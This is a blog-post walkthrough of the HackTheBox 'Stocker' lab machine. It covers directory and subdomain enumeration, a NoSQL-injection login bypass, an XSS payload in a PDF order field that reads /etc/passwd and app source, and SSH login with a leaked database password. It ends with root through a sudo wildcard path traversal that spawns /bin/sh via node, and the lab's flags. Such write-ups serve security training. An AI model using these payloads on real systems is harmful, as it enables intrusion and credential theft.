---
layout: post
author: k0d14k
---

# Stocker

CTF: hackthebox

Category: Machine


Difficulty: Easy

# Description

---

`address` : [https://app.hackthebox.com/machines/523](https://app.hackthebox.com/machines/523)

## Intro

In this hack the box machine I want to apply a pentesting procedure learned during a udemy course.

The solution is made up references and some exploits recycled by our notion library.

Let’s see step by step how I pwned this machine.

# Information gathering.

First of all let’s add the provided IP to out `/etc/hosts` file.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo su                                               
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali]
└─# echo "10.10.11.196 stocker.htb" >> /etc/hosts 
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali]
└─#
```

Now we can navigate the web site.

It seems an e-commerce as IKEA but in this web site I found nothing.

Let’s perform some enumeration over directories and subdomains.

## Directories enumeration

To enumerate directories We use `gobuster` with a word list for directory enumeration.

I found some files in google (In links and tools I’ll push my word lists).

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u stocker.htb/ -w ~/Documents/vm_shared/utils/wordlists/dirbusting/directory-list-lowercase-2.3-small.txt --delay 1000ms -t 100
```

Let’s explain our command.

- `dir` is used to put `gobuster` in directory enumeration mode.
- `-u` is used to set the `url` to be enumerated.
- `-w` is used to point to our word list
- `--delay` is used to set a response delay time.
- `-t` is used to set the number of threads.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u stocker.htb/ -w ~/Documents/vm_shared/utils/wordlists/dirbusting/directory-list-lowercase-2.3-small.txt --delay 1000ms -t 100
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://stocker.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Delay:                   1s
[+] Wordlist:                /home/kali/Documents/vm_shared/utils/wordlists/dirbusting/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/28 14:37:44 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 178] [--> http://stocker.htb/img/]
/css                  (Status: 301) [Size: 178] [--> http://stocker.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://stocker.htb/js/]
/fonts                (Status: 301) [Size: 178] [--> http://stocker.htb/fonts/]
Progress: 40610 / 81644 (49.74%)[ERROR] 2023/01/28 14:45:32 [!] Get "http://stocker.htb/p07": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
```

The command has finished its execution, but found nothing interesting.

## Subdomain enumeration.

Even with `gobuster` we set the `VHOST` mode and change the word list to perform the subdomain enumeration. An other update is to add `--append-domain` to model the `url`.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u stocker.htb -w ~/Documents/vm_shared/utils/wordlists/subdomain-enum/subdomains-small.txt --delay 1000ms -t 100 --append-domain
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         100
[+] Delay:           1s
[+] Wordlist:        /home/kali/Documents/vm_shared/utils/wordlists/subdomain-enum/subdomains-small.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/28 14:49:36 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4989 / 4990 (99.98%)
===============================================================
2023/01/28 14:50:33 Finished
===============================================================
```

We found a subdomain. Now We have to restart our analysis from the new domain.

1. Add the domain with `echo "10.10.11.196 dev.stocker.htb" >> /etc/hosts`
2. Directory enumeration
3. Subdomain enumeration

In this case the directory enumeration produces some interesting paths.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u dev.stocker.htb/ -w ~/Documents/vm_shared/utils/wordlists/dirbusting/directory-list-lowercase-2.3-small.txt --delay 1000ms -t 100
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.stocker.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Delay:                   1s
[+] Wordlist:                /home/kali/Documents/vm_shared/utils/wordlists/dirbusting/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/28 14:56:00 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2667]
/static               (Status: 301) [Size: 179] [--> /static/]
/logout               (Status: 302) [Size: 28] [--> /login]
/stock                (Status: 302) [Size: 48] [--> /login?error=auth-required]
/cholesterol          (Status: 502) [Size: 166]
/about-off            (Status: 502) [Size: 166]
```

Ok, We now have something to work.

The last thing we can do for now is to get the kind of technology used in the server. To do that We simply open the login page and intercept the request in `Burp Suite`.

```bash
HTTP/1.1 304 Not Modified
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 28 Jan 2023 14:02:22 GMT
Connection: close
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 06 Dec 2022 09:53:59 GMT
ETag: W/"a6b-184e6db4279"
```

Here We can see that We have a `nginx` server hosting a `NodeJs - Express` application.

Let’s start with application pentesting.

# Application Pentesting.

![Screenshot_2023-01-28_15-05-53.png](Stocker%208be61598711c4b7bbdfe347f58eba7d8/Screenshot_2023-01-28_15-05-53.png)

Here we have a login. The session cookie appears not vulnerable so We have just two ways.

1. SQLInjection
2. NoSQLInjection

In HackTheBox when We have a node application We have (In the most of cases) a NoSQL db.

Googling for some NoSQLInjection payloads I found a usefull cheatsheet : 

[PayloadsAllTheThings/NoSQL Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

Let’s compose our HttpRequest for burp as follows:

1. Intercept a POST request from login
2. Change `Content-Type: application/x-www-form-urlencoded` into `Content-Type: application/json`
3. Insert a payload from this cheat sheet as body (I’ll use `{"username": {"$ne": null}, "password": {"$ne": null}}`)

```bash
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 54
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3ADFDen9ndX9YhJQIRnVnuvrdiVXf-w1Vs.Eo%2F7JNvnDg1VAkew8sYHN%2F%2BkDkm4xPR1dQA5uM8I4Bk
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null}}
```

Perform this request and follow the redirect to get logged in.

![Screenshot_2023-01-28_15-14-14.png](Stocker%208be61598711c4b7bbdfe347f58eba7d8/Screenshot_2023-01-28_15-14-14.png)

From this page I tried to perform an order and, once completed, it releases a PDF with the receipt.

This behavior makes me mind to an Insomni’hack challenge where We were able to perform an XSS and effectively there was an XSS into the title field.

```bash
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 156
Connection: close
Cookie: connect.sid=s%3ADFDen9ndX9YhJQIRnVnuvrdiVXf-w1Vs.Eo%2F7JNvnDg1VAkew8sYHN%2F%2BkDkm4xPR1dQA5uM8I4Bk

{"basket":[{"_id":"638f116eeb060210cbd83a91","title":"<script>document.write('kodiak')</script>","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0,"amount":1}]}
```

![Screenshot_2023-01-28_15-29-31.png](Stocker%208be61598711c4b7bbdfe347f58eba7d8/Screenshot_2023-01-28_15-29-31.png)

# Getting an access.

By this vulnerability We can exfiltrate some interesting files. To avoid to get a huge writeup I’ll put here just payloads but the usage it’s ever the same.

First of all I have dumped the `nginx.conf` file.

```bash
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\"GET\",\"file:///etc/nginx/nginx.conf\");x.send();</script>
```

In this file We discover that the `dev` application it’s stored in `/var/www/dev`

```bash
## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf;
 server { listen 80;
 root /var/www/dev;

index index.html index.htm index.nginx-debian.html;
 server_name dev.stocker.htb;
 location / { proxy_pass
http://127.0.0.1:3000;
 proxy_http_version 1.1;
 proxy_cache_bypass $http_upgrade;
 proxy_set_header Upgrade
$http_upgrade;
 proxy_set_header Connection "upgrade";
 proxy_set_header Host $host;
 proxy_set_header X-Real-IP
$remote_addr;
 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
 proxy_set_header X-Forwarded-
Proto $scheme;
 proxy_set_header X-Forwarded-Host $host;
 proxy_set_header X-Forwarded-Port $server_port;
 } }
```

From this directory We can dump the `index.js` file

```bash
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\"GET\",\"file:///var/www/dev/index.js\");x.send();</script>
```

From this file We dump a `mongodb` connection string. Assuming that it is an `easy machine` i guess that the mongodb user password was the same as the ssh user.

```bash
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

Then I dumped the `/etc/passwd` file to get the username:

```bash
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\"GET\",\"file:///etc/passwd\");x.send();</script>
```

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin`
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

## SSH Shell (Step 1).

Call a ssh command with `angoose` as username and `IHeardPassphrasesArePrettySecure` as password and then…

```bash
┌──(kali㉿kali)-[~]
└─$ ssh angoose@dev.stocker.htb
angoose@dev.stocker.htb's password: 
Last login: Sat Jan 28 16:26:11 2023 from 10.10.16.6
angoose@stocker:~$
```

You’re logged in.

# Privilege escalation.

As ever We call `sudo -l` to know if there is any command executable as root.

```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$
```

We can execute `node` starting from the path `/usr/local/scripts/*.js`.

This is little tricky and it takes too time to understand it for me too.

The key is in the `*`. It meas exactly EVERYTHING.

Once I understood this behavior the exploit it’s pretty simple:

```bash
angoose@stocker:~$ echo "require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})" > /home/angoose/shell.js
angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/shell.js 
# whoami
root
#
```

## Stabilize the shell

Now, We can get an interactive shell using python:

```bash
# python3 -c "import pty; pty.spawn('/bin/bash')"    
root@stocker:/home/angoose#
```

### Flags:

`cat /home/angoose/user.txt`: 6aefe1ccdaf55ae457e29547aa295e29

`cat /root/root.txt`: 1eb7cf4187a3af712182c022ac0745bf

---

# Links and tools

---

[directory-list-lowercase-2.3-small.txt](Stocker%208be61598711c4b7bbdfe347f58eba7d8/directory-list-lowercase-2.3-small.txt)

[subdomains-small.txt](Stocker%208be61598711c4b7bbdfe347f58eba7d8/subdomains-small.txt)

`NoSQLInjection cheatsheet` : [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

`Executing Shell command with nodeJS`  : [https://stackabuse.com/executing-shell-commands-with-node-js/](https://stackabuse.com/executing-shell-commands-with-node-js/)